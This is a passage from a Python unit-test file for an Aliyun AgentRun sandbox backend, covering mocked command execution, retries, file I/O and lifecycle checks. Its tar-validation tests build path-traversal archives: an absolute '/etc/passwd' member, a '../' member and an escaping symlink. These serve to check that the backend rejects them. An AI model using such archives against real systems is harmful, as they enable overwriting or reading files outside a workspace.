"""Unit tests for the Aliyun AgentRun sandbox backend.

The `agentrun-sdk` is mocked via `sys.modules` injection so these tests do not
need the real package installed and never touch Alibaba Cloud.
"""

from __future__ import annotations

import asyncio
import importlib
import io
import logging
import sys
import tarfile
import types
import uuid
from pathlib import Path
from typing import Any, Literal, cast
from unittest.mock import MagicMock

import pytest
from pydantic import BaseModel

from agents.sandbox.errors import (
    ConfigurationError,
    ExecTimeoutError,
    ExecTransportError,
    ExposedPortUnavailableError,
    WorkspaceArchiveReadError,
    WorkspaceArchiveWriteError,
    WorkspaceReadNotFoundError,
    WorkspaceStartError,
    WorkspaceWriteTypeError,
)
from agents.sandbox.manifest import Environment, Manifest
from agents.sandbox.session.sandbox_session_state import SandboxSessionState
from agents.sandbox.snapshot import NoopSnapshot
from agents.sandbox.types import User

# --------------------------------------------------------------------------- #
# Fake agentrun-sdk                                                           #
# --------------------------------------------------------------------------- #


class _FakeHTTPError(Exception):
    """Stand-in for the SDK's HTTP error carrying a `status_code`."""

    def __init__(self, status_code: int, message: str | None = None) -> None:
        super().__init__(message or f"HTTP {status_code}")
        self.status_code = status_code


class _FakeProcess:
    """Stand-in for `sandbox.process`. Records calls + returns scripted results."""

    def __init__(self) -> None:
        self.calls: list[dict[str, Any]] = []
        self.result: dict[str, Any] = {
            "stdout": "",
            "stderr": "",
            "exitCode": 0,
        }
        self.exception: BaseException | None = None
        # A queue of per-call outcomes: an exception is raised, `None` falls through
        # to `result`. Used to script gateway-502 retry behavior.
        self.exceptions: list[BaseException | None] = []
        self.side_effect: Any = None

    async def cmd_async(self, *, command: str, cwd: str | None = None, timeout: int = 30) -> Any:
        self.calls.append({"command": command, "cwd": cwd, "timeout": timeout})
        if self.exceptions:
            exc = self.exceptions.pop(0)
            if exc is not None:
                raise exc
        if self.side_effect is not None:
            return self.side_effect(command=command, cwd=cwd, timeout=timeout)
        if self.exception is not None:
            raise self.exception
        return self.result


class _FakeFileSystem:
    """Stand-in for `sandbox.file_system`. Tracks uploads/downloads in-memory."""

    def __init__(self) -> None:
        self.files: dict[str, bytes] = {}
        self.upload_calls: list[tuple[str, str]] = []
        self.download_calls: list[tuple[str, str]] = []
        self.upload_exception: BaseException | None = None
        self.download_exception: BaseException | None = None

    async def upload_async(self, *, local_file_path: str, target_file_path: str) -> None:
        self.upload_calls.append((local_file_path, target_file_path))
        if self.upload_exception is not None:
            raise self.upload_exception
        with open(local_file_path, "rb") as fh:
            self.files[target_file_path] = fh.read()

    async def download_async(self, *, path: str, save_path: str) -> None:
        self.download_calls.append((path, save_path))
        if self.download_exception is not None:
            raise self.download_exception
        if path not in self.files:
            raise FileNotFoundError(path)
        with open(save_path, "wb") as fh:
            fh.write(self.files[path])


class _FakeCodeInterpreterSandbox:
    """Stand-in for `agentrun.sandbox.code_interpreter_sandbox.CodeInterpreterSandbox`."""

    def __init__(self, *, sandbox_id: str = "fake-sandbox-id") -> None:
        self.sandbox_id = sandbox_id
        self.process = _FakeProcess()
        self.file_system = _FakeFileSystem()
        # `running()` reads this via `check_health_async`; may also be an exception.
        self.health: Any = {"status": "ok"}
        self.delete_async_calls = 0
        self._config: Any = None

    def model_dump(self, by_alias: bool = False) -> dict[str, Any]:
        # Carry the live object so `model_validate` can hand back the same instance,
        # preserving the in-memory process / file_system the test configured.
        return {"sandbox_id": self.sandbox_id, "__self__": self}

    @classmethod
    def model_validate(cls, data: dict[str, Any]) -> _FakeCodeInterpreterSandbox:
        return cast(_FakeCodeInterpreterSandbox, data["__self__"])

    async def check_health_async(self) -> Any:
        health = self.health
        if isinstance(health, list):
            # A scripted sequence of health payloads; falls back to ready once drained.
            health = health.pop(0) if health else {"status": "ok"}
        if isinstance(health, BaseException):
            raise health
        return health

    async def delete_async(self) -> None:
        self.delete_async_calls += 1


class _FakeSandboxClient:
    """Stand-in for `agentrun.sandbox.client.SandboxClient`."""

    create_calls: list[dict[str, Any]] = []
    delete_calls: list[str] = []
    get_calls: list[str] = []
    create_failures: list[BaseException] = []
    next_sandbox: _FakeCodeInterpreterSandbox | None = None
    get_result: Any = None

    def __init__(self, *, config: Any) -> None:
        self.config = config

    @classmethod
    def reset(cls) -> None:
        cls.create_calls = []
        cls.delete_calls = []
        cls.get_calls = []
        cls.create_failures = []
        cls.next_sandbox = None
        cls.get_result = None

    async def create_sandbox_async(
        self,
        *,
        template_name: str,
        sandbox_idle_timeout_seconds: int | None = None,
        oss_mount_config: Any | None = None,
        nas_config: Any | None = None,
        polar_fs_config: Any | None = None,
    ) -> _FakeCodeInterpreterSandbox:
        type(self).create_calls.append(
            {
                "template_name": template_name,
                "sandbox_idle_timeout_seconds": sandbox_idle_timeout_seconds,
                "oss_mount_config": oss_mount_config,
                "nas_config": nas_config,
                "polar_fs_config": polar_fs_config,
            }
        )
        if type(self).create_failures:
            raise type(self).create_failures.pop(0)
        return type(self).next_sandbox or _FakeCodeInterpreterSandbox()

    async def delete_sandbox_async(self, *, sandbox_id: str) -> None:
        type(self).delete_calls.append(sandbox_id)

    async def get_sandbox_async(self, *, sandbox_id: str) -> Any:
        type(self).get_calls.append(sandbox_id)
        result = type(self).get_result
        if isinstance(result, BaseException):
            raise result
        return result


class _FakeConfig:
    """Stand-in for `agentrun.utils.config.Config`."""

    def __init__(self, **kwargs: Any) -> None:
        self.kwargs = kwargs


class _FakeOSSMountConfig(BaseModel):
    pass


class _FakeNASConfig(BaseModel):
    pass


class _FakePolarFsConfig(BaseModel):
    pass


def _load_aliyun_module(monkeypatch: pytest.MonkeyPatch) -> Any:
    """Inject a fake `agentrun` package and reload the wrapper module."""
    _FakeSandboxClient.reset()

    fake_agentrun = types.ModuleType("agentrun")
    fake_sandbox_pkg = cast(Any, types.ModuleType("agentrun.sandbox"))
    fake_client_mod = cast(Any, types.ModuleType("agentrun.sandbox.client"))
    fake_client_mod.SandboxClient = _FakeSandboxClient
    fake_cis_mod = cast(Any, types.ModuleType("agentrun.sandbox.code_interpreter_sandbox"))
    fake_cis_mod.CodeInterpreterSandbox = _FakeCodeInterpreterSandbox
    fake_model_mod = cast(Any, types.ModuleType("agentrun.sandbox.model"))
    fake_model_mod.OSSMountConfig = _FakeOSSMountConfig
    fake_model_mod.NASConfig = _FakeNASConfig
    fake_model_mod.PolarFsConfig = _FakePolarFsConfig
    fake_utils_pkg = cast(Any, types.ModuleType("agentrun.utils"))
    fake_config_mod = cast(Any, types.ModuleType("agentrun.utils.config"))
    fake_config_mod.Config = _FakeConfig

    monkeypatch.setitem(sys.modules, "agentrun", fake_agentrun)
    monkeypatch.setitem(sys.modules, "agentrun.sandbox", fake_sandbox_pkg)
    monkeypatch.setitem(sys.modules, "agentrun.sandbox.client", fake_client_mod)
    monkeypatch.setitem(sys.modules, "agentrun.sandbox.code_interpreter_sandbox", fake_cis_mod)
    monkeypatch.setitem(sys.modules, "agentrun.sandbox.model", fake_model_mod)
    monkeypatch.setitem(sys.modules, "agentrun.utils", fake_utils_pkg)
    monkeypatch.setitem(sys.modules, "agentrun.utils.config", fake_config_mod)

    sys.modules.pop("agents.extensions.sandbox.aliyun.sandbox", None)
    sys.modules.pop("agents.extensions.sandbox.aliyun", None)

    return importlib.import_module("agents.extensions.sandbox.aliyun.sandbox")


# --------------------------------------------------------------------------- #
# Helpers                                                                     #
# --------------------------------------------------------------------------- #


def _make_state(aliyun_sandbox: Any, **overrides: Any) -> Any:
    base: dict[str, Any] = {
        "session_id": uuid.uuid4(),
        "manifest": Manifest(root=aliyun_sandbox.DEFAULT_ALIYUN_WORKSPACE_ROOT),
        "snapshot": NoopSnapshot(id="test"),
        "sandbox_id": "test-sandbox",
    }
    base.update(overrides)
    return aliyun_sandbox.AliyunSandboxSessionState(**base)


def _make_session(
    aliyun_sandbox: Any,
    *,
    state: Any | None = None,
    sandbox: _FakeCodeInterpreterSandbox | None = None,
    client: _FakeSandboxClient | None = None,
    config: Any | None = None,
    bypass_validate: bool = True,
) -> Any:
    """Build an `AliyunSandboxSession` wired up with fake AgentRun primitives."""
    state = state or _make_state(aliyun_sandbox)
    sandbox = sandbox if sandbox is not None else _FakeCodeInterpreterSandbox()
    session = aliyun_sandbox.AliyunSandboxSession.from_state(
        state,
        sandbox=sandbox,
        client=client,
        config=config,
    )
    if bypass_validate:

        async def _identity(path: Any, *, for_write: bool = False) -> Path:
            return path if isinstance(path, Path) else Path(path)

        session._validate_path_access = _identity
    return session


def _make_tar(members: dict[str, bytes]) -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w") as tar:
        for name, content in members.items():
            info = tarfile.TarInfo(name=name)
            info.size = len(content)
            tar.addfile(info, io.BytesIO(content))
    return buf.getvalue()


def _make_tar_with_symlink(name: str, target: str) -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w") as tar:
        info = tarfile.TarInfo(name=name)
        info.type = tarfile.SYMTYPE
        info.linkname = target
        tar.addfile(info)
    return buf.getvalue()


def _env_prefix(command: str) -> str:
    """Return the leading `KEY=val ...` env prefix of a recorded command (or '')."""
    parts = []
    for token in command.split(" "):
        if "=" in token and not token.startswith("-"):
            parts.append(token)
        else:
            break
    return " ".join(parts)


# --------------------------------------------------------------------------- #
# A. Module structure & imports                                               #
# --------------------------------------------------------------------------- #


def test_package_re_exports_backend_symbols(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    package_module = importlib.import_module("agents.extensions.sandbox.aliyun")

    assert package_module.AliyunSandboxClient is aliyun_sandbox.AliyunSandboxClient
    assert package_module.AliyunSandboxSessionState is aliyun_sandbox.AliyunSandboxSessionState
    assert set(package_module.__all__) == {
        "AliyunSandboxClient",
        "AliyunSandboxClientOptions",
        "AliyunSandboxSession",
        "AliyunSandboxSessionState",
        "DEFAULT_ALIYUN_WORKSPACE_ROOT",
    }


def test_type_discriminators(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    assert aliyun_sandbox.AliyunSandboxClientOptions().type == "aliyun"
    assert _make_state(aliyun_sandbox).type == "aliyun"


def test_options_pydantic_roundtrip(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    opts = aliyun_sandbox.AliyunSandboxClientOptions(
        access_key_id="ak",
        access_key_secret="sk",
        account_id="acct",
        api_key="key",
        region="cn-shanghai",
        template_name="custom",
        sandbox_idle_timeout_seconds=900,
        env={"FOO": "bar"},
    )
    payload = opts.model_dump()
    restored = aliyun_sandbox.AliyunSandboxClientOptions.model_validate(payload)
    assert restored == opts
    assert payload["type"] == "aliyun"


def test_options_positional_args(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    opts = aliyun_sandbox.AliyunSandboxClientOptions("ak", "sk", "acct", "key")
    assert opts.access_key_id == "ak"
    assert opts.access_key_secret == "sk"
    assert opts.account_id == "acct"
    assert opts.api_key == "key"


# --------------------------------------------------------------------------- #
# B. Helper functions                                                         #
# --------------------------------------------------------------------------- #


def test_resolve_manifest_root_none(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    manifest = aliyun_sandbox._resolve_manifest_root(None)
    assert manifest.root == aliyun_sandbox.DEFAULT_ALIYUN_WORKSPACE_ROOT


def test_resolve_manifest_root_default_overridden(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    manifest = aliyun_sandbox._resolve_manifest_root(Manifest())
    assert manifest.root == aliyun_sandbox.DEFAULT_ALIYUN_WORKSPACE_ROOT


def test_resolve_manifest_root_custom_preserved(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    manifest = aliyun_sandbox._resolve_manifest_root(Manifest(root="/custom/root"))
    assert manifest.root == "/custom/root"


def test_build_config_passes_credentials(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    config = aliyun_sandbox._build_config(
        access_key_id="ak",
        access_key_secret="sk",
        account_id="acct",
        api_key="key",
        region="cn-shanghai",
    )
    assert isinstance(config, _FakeConfig)
    assert config.kwargs["access_key_id"] == "ak"
    assert config.kwargs["access_key_secret"] == "sk"
    assert config.kwargs["account_id"] == "acct"
    assert config.kwargs["region_id"] == "cn-shanghai"
    assert config.kwargs["headers"] == {"X-API-Key": "key"}


def test_build_config_without_api_key_omits_headers(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    config = aliyun_sandbox._build_config(
        access_key_id=None,
        access_key_secret=None,
        account_id=None,
        api_key=None,
        region="cn-hangzhou",
    )
    assert config.kwargs["headers"] is None


def test_is_retryable_gateway_only_502(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    assert aliyun_sandbox._is_retryable_gateway(_FakeHTTPError(502)) is True
    assert aliyun_sandbox._is_retryable_gateway(_FakeHTTPError(400)) is False
    assert aliyun_sandbox._is_retryable_gateway(RuntimeError("502: bad gateway")) is True
    assert aliyun_sandbox._is_retryable_gateway(RuntimeError("nope")) is False


def test_is_not_found_error(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    assert aliyun_sandbox._is_not_found_error(_FakeHTTPError(404)) is True
    assert aliyun_sandbox._is_not_found_error(RuntimeError("file not found")) is True
    assert aliyun_sandbox._is_not_found_error(RuntimeError("boom")) is False


# --------------------------------------------------------------------------- #
# C. User-arg rejection                                                       #
# --------------------------------------------------------------------------- #


async def test_exec_rejects_user(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    session = _make_session(aliyun_sandbox)
    with pytest.raises(ConfigurationError) as excinfo:
        await session.exec("echo", "hi", user="root")
    assert excinfo.value.context["backend"] == "aliyun"


async def test_read_rejects_user(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    session = _make_session(aliyun_sandbox)
    with pytest.raises(ConfigurationError):
        await session.read(Path("/home/user/x"), user="root")


async def test_write_rejects_user(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    session = _make_session(aliyun_sandbox)
    with pytest.raises(ConfigurationError):
        await session.write(
            Path("/home/user/x"),
            io.BytesIO(b""),
            user=User(name="root"),
        )


async def test_append_rejects_user(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    session = _make_session(aliyun_sandbox)
    with pytest.raises(ConfigurationError):
        await session.append(Path("/home/user/x"), io.BytesIO(b""), user="root")


# --------------------------------------------------------------------------- #
# D. _exec_internal                                                           #
# --------------------------------------------------------------------------- #


async def test_exec_happy_path(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    sandbox = _FakeCodeInterpreterSandbox()
    sandbox.process.result = {"stdout": "hello\n", "stderr": "", "exitCode": 0}
    session = _make_session(aliyun_sandbox, sandbox=sandbox)

    result = await session._exec_internal("echo", "hello")
    assert result.exit_code == 0
    assert result.stdout == b"hello\n"
    assert result.stderr == b""
    assert result.ok() is True
    assert sandbox.process.calls[-1]["command"] == "echo hello"


async def test_exec_runs_in_manifest_root(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    sandbox = _FakeCodeInterpreterSandbox()
    session = _make_session(aliyun_sandbox, sandbox=sandbox)
    await session._exec_internal("pwd")
    # All execs (user and internal) run from the workspace root.
    assert sandbox.process.calls[-1]["cwd"] == aliyun_sandbox.DEFAULT_ALIYUN_WORKSPACE_ROOT


async def test_exec_without_env_has_no_prefix(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    sandbox = _FakeCodeInterpreterSandbox()
    session = _make_session(aliyun_sandbox, sandbox=sandbox)
    await session._exec_internal("echo", "hi")
    # No configured env → command is unprefixed.
    assert sandbox.process.calls[-1]["command"] == "echo hi"


async def test_exec_shell_false_gets_env_prefix(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    sandbox = _FakeCodeInterpreterSandbox()
    session = _make_session(
        aliyun_sandbox,
        state=_make_state(aliyun_sandbox, env={"FOO": "bar"}),
        sandbox=sandbox,
    )
    # Env is inlined per command, so even a direct shell=False exec carries it.
    await session.exec("python", "app.py", shell=False)
    cmd = sandbox.process.calls[-1]["command"]
    assert cmd == "FOO=bar python app.py"


async def test_exec_multi_arg_shlex_joined(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    sandbox = _FakeCodeInterpreterSandbox()
    session = _make_session(aliyun_sandbox, sandbox=sandbox)
    await session._exec_internal("ls", "-la", "/tmp dir with space")
    sent = sandbox.process.calls[-1]["command"]
    assert "'/tmp dir with space'" in sent or '"/tmp dir with space"' in sent


async def test_exec_empty_command_no_call(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    sandbox = _FakeCodeInterpreterSandbox()
    session = _make_session(aliyun_sandbox, sandbox=sandbox)
    result = await session._exec_internal()
    assert result.stdout == b""
    assert result.stderr == b""
    assert result.exit_code == 0
    assert sandbox.process.calls == []


async def test_exec_outer_timeout(monkeypatch: pytest.MonkeyPatch) -> None:
    """When the wrapper's outer `asyncio.wait_for` fires, raise ExecTimeoutError."""
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    sandbox = _FakeCodeInterpreterSandbox()

    async def _slow(*, command: str, cwd: str | None = None, timeout: int = 30) -> Any:
        sandbox.process.calls.append({"command": command, "cwd": cwd, "timeout": timeout})
        await asyncio.sleep(10)
        return {"stdout": "", "stderr": "", "exitCode": 0}

    sandbox.process.cmd_async = _slow  # type: ignore[method-assign]
    session = _make_session(aliyun_sandbox, sandbox=sandbox)
    with pytest.raises(ExecTimeoutError):
        await session._exec_internal("sleep", "10", timeout=0.01)


async def test_exec_transport_error_wraps_exception(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    sandbox = _FakeCodeInterpreterSandbox()
    sandbox.process.exception = RuntimeError("boom")
    session = _make_session(aliyun_sandbox, sandbox=sandbox)
    # A non-502, non-timeout failure surfaces as ExecTransportError.
    with pytest.raises(ExecTransportError) as excinfo:
        await session._exec_internal("echo", "hi")
    assert excinfo.value.context["backend"] == "aliyun"


async def test_exec_provider_timeout_becomes_exec_timeout(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    sandbox = _FakeCodeInterpreterSandbox()
    sandbox.process.exception = TimeoutError("command timed out after 30s")
    session = _make_session(aliyun_sandbox, sandbox=sandbox)
    with pytest.raises(ExecTimeoutError) as excinfo:
        await session._exec_internal("echo", "hi")
    assert "timed out" in str(excinfo.value.__cause__).lower()


async def test_exec_nonzero_exit_returns_result(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    sandbox = _FakeCodeInterpreterSandbox()
    sandbox.process.result = {"stdout": "", "stderr": "fail", "exitCode": 2}
    session = _make_session(aliyun_sandbox, sandbox=sandbox)
    result = await session._exec_internal("false")
    assert result.exit_code == 2
    assert result.stderr == b"fail"
    assert result.ok() is False


# --------------------------------------------------------------------------- #
# D2. _run_command gateway-502 retry                                          #
# --------------------------------------------------------------------------- #


async def test_run_command_retries_on_gateway_502(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    monkeypatch.setattr(aliyun_sandbox, "ALIYUN_GATEWAY_502_BACKOFF_BASE_S", 0.0)
    sandbox = _FakeCodeInterpreterSandbox()
    sandbox.process.exceptions = [_FakeHTTPError(502)]  # first attempt fails, then succeeds
    sandbox.process.result = {"stdout": "ok", "stderr": "", "exitCode": 0}
    session = _make_session(aliyun_sandbox, sandbox=sandbox)

    exit_code, stdout, _stderr = await session._run_command(sandbox, "echo", ["hi"])
    assert exit_code == 0
    assert stdout == "ok"
    assert len(sandbox.process.calls) == 2


async def test_run_command_no_retry_on_non_502(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    sandbox = _FakeCodeInterpreterSandbox()
    sandbox.process.exception = _FakeHTTPError(400)
    session = _make_session(aliyun_sandbox, sandbox=sandbox)

    with pytest.raises(_FakeHTTPError):
        await session._run_command(sandbox, "echo", ["hi"])
    assert len(sandbox.process.calls) == 1


async def test_run_command_forwards_caller_timeout(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    sandbox = _FakeCodeInterpreterSandbox()
    session = _make_session(aliyun_sandbox, sandbox=sandbox)
    # A caller-requested timeout above the SDK default is forwarded as-is, not clamped.
    await session._run_command(sandbox, "echo", ["hi"], timeout_s=999)
    assert sandbox.process.calls[-1]["timeout"] == 999


async def test_run_command_defaults_timeout_when_unset(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    sandbox = _FakeCodeInterpreterSandbox()
    session = _make_session(aliyun_sandbox, sandbox=sandbox)
    await session._run_command(sandbox, "echo", ["hi"])
    assert sandbox.process.calls[-1]["timeout"] == aliyun_sandbox.DEFAULT_ALIYUN_EXEC_TIMEOUT_S


async def test_run_command_rounds_up_fractional_timeout(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    sandbox = _FakeCodeInterpreterSandbox()
    session = _make_session(aliyun_sandbox, sandbox=sandbox)
    # A fractional budget must round up, not truncate down (1.9 -> 2, not 1).
    await session._run_command(sandbox, "echo", ["hi"], timeout_s=1.9)
    assert sandbox.process.calls[-1]["timeout"] == 2


# --------------------------------------------------------------------------- #
# E. File I/O                                                                 #
# --------------------------------------------------------------------------- #


async def test_write_bytes(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    sandbox = _FakeCodeInterpreterSandbox()
    session = _make_session(aliyun_sandbox, sandbox=sandbox)
    await session.write(Path("/home/user/file.bin"), io.BytesIO(b"\x00\x01"))
    assert sandbox.file_system.files["/home/user/file.bin"] == b"\x00\x01"


async def test_write_string_utf8_encoded(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    sandbox = _FakeCodeInterpreterSandbox()
    session = _make_session(aliyun_sandbox, sandbox=sandbox)
    await session.write(Path("/home/user/file.txt"), io.StringIO("héllo"))
    assert sandbox.file_system.files["/home/user/file.txt"] == "héllo".encode()


async def test_write_invalid_payload_type(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)

    class WeirdStream:
        def read(self) -> int:
            return 42

    session = _make_session(aliyun_sandbox)
    with pytest.raises(WorkspaceWriteTypeError):
        await session.write(Path("/home/user/file.bin"), WeirdStream())


async def test_write_upload_failure(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    sandbox = _FakeCodeInterpreterSandbox()
    sandbox.file_system.upload_exception = RuntimeError("upload fail")
    session = _make_session(aliyun_sandbox, sandbox=sandbox)
    with pytest.raises(WorkspaceArchiveWriteError) as excinfo:
        await session.write(Path("/home/user/file.bin"), io.BytesIO(b"x"))
    assert "upload fail" in str(excinfo.value.__cause__)


async def test_write_rejects_oversized_payload(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    monkeypatch.setattr(aliyun_sandbox, "ALIYUN_FILESYSTEM_UPLOAD_MAX_BYTES", 4)
    sandbox = _FakeCodeInterpreterSandbox()
    session = _make_session(aliyun_sandbox, sandbox=sandbox)
    with pytest.raises(WorkspaceArchiveWriteError) as excinfo:
        await session._sandbox_write_file(sandbox, Path("/home/user/big.bin"), b"12345")
    assert excinfo.value.context["reason"] == "upload_exceeds_100mb"


async def test_read_happy(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    sandbox = _FakeCodeInterpreterSandbox()
    sandbox.file_system.files["/home/user/file.bin"] = b"hello\xff\x00world"
    session = _make_session(aliyun_sandbox, sandbox=sandbox)
    buf = await session.read(Path("/home/user/file.bin"))
    assert buf.read() == b"hello\xff\x00world"


async def test_read_not_found_raises_workspace_read_not_found(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    sandbox = _FakeCodeInterpreterSandbox()
    # The file is absent, so download_async raises FileNotFoundError → not found.
    session = _make_session(aliyun_sandbox, sandbox=sandbox)
    with pytest.raises(WorkspaceReadNotFoundError):
        await session.read(Path("/home/user/missing.bin"))


async def test_read_download_transport_error(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    sandbox = _FakeCodeInterpreterSandbox()
    sandbox.file_system.download_exception = RuntimeError("network")
    session = _make_session(aliyun_sandbox, sandbox=sandbox)
    with pytest.raises(WorkspaceArchiveReadError):
        await session.read(Path("/home/user/file.bin"))


async def test_append_creates_then_appends(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    sandbox = _FakeCodeInterpreterSandbox()
    session = _make_session(aliyun_sandbox, sandbox=sandbox)
    await session.append(Path("/home/user/log.txt"), io.BytesIO(b"a"))
    await session.append(Path("/home/user/log.txt"), io.BytesIO(b"b"))
    assert sandbox.file_system.files["/home/user/log.txt"] == b"ab"


async def test_append_invalid_payload_type(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)

    class WeirdStream:
        def read(self) -> int:
            return 7

    session = _make_session(aliyun_sandbox)
    with pytest.raises(WorkspaceWriteTypeError):
        await session.append(Path("/home/user/log.txt"), WeirdStream())


async def test_append_via_wrapper(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    fake_sandbox = _FakeCodeInterpreterSandbox(sandbox_id="wrap")
    _FakeSandboxClient.next_sandbox = fake_sandbox
    client = aliyun_sandbox.AliyunSandboxClient()
    session = await client.create(options=aliyun_sandbox.AliyunSandboxClientOptions())

    async def _identity(path: Any, *, for_write: bool = False) -> Path:
        return path if isinstance(path, Path) else Path(path)

    session._inner._validate_path_access = _identity
    await session.append(Path("/home/user/w.txt"), io.BytesIO(b"z"))
    assert fake_sandbox.file_system.files["/home/user/w.txt"] == b"z"


# --------------------------------------------------------------------------- #
# F. Tar validation                                                           #
# --------------------------------------------------------------------------- #


def test_validate_tar_bytes_safe(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    session = _make_session(aliyun_sandbox)
    raw = _make_tar({"a.txt": b"x", "sub/b.txt": b"y"})
    session._validate_tar_bytes(raw)  # should not raise


def test_validate_tar_bytes_absolute_rejected(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    session = _make_session(aliyun_sandbox)
    raw = _make_tar({"/etc/passwd": b"x"})
    with pytest.raises(ValueError):
        session._validate_tar_bytes(raw)


def test_validate_tar_bytes_dotdot_rejected(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    session = _make_session(aliyun_sandbox)
    raw = _make_tar({"../escape.txt": b"x"})
    with pytest.raises(ValueError):
        session._validate_tar_bytes(raw)


def test_validate_tar_bytes_invalid_stream(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    session = _make_session(aliyun_sandbox)
    with pytest.raises(ValueError):
        session._validate_tar_bytes(b"not a tar")


def test_validate_tar_bytes_external_symlink_rejected(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    session = _make_session(aliyun_sandbox)
    # A symlink whose target escapes the workspace root must be rejected before the
    # archive is handed to a remote `tar xf`.
    raw = _make_tar_with_symlink("link", "../../etc/passwd")
    with pytest.raises(ValueError):
        session._validate_tar_bytes(raw)


# --------------------------------------------------------------------------- #
# G. Lifecycle                                                                #
# --------------------------------------------------------------------------- #


async def test_running_true(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    sandbox = _FakeCodeInterpreterSandbox()
    sandbox.health = {"status": "ok"}
    session = _make_session(aliyun_sandbox, sandbox=sandbox)
    assert await session.running() is True


async def test_running_no_sandbox(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    state = _make_state(aliyun_sandbox)
    session = aliyun_sandbox.AliyunSandboxSession.from_state(state)  # no sandbox injected
    assert await session.running() is False


async def test_running_health_raises(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    sandbox = _FakeCodeInterpreterSandbox()
    sandbox.health = RuntimeError("dead")
    session = _make_session(aliyun_sandbox, sandbox=sandbox)
    assert await session.running() is False


async def test_running_non_dict_health(monkeypatch: pytest.MonkeyPatch) -> None:
    aliyun_sandbox = _load_aliyun_module(monkeypatch)
    sandbox = _FakeCodeInterpreterSandbox()
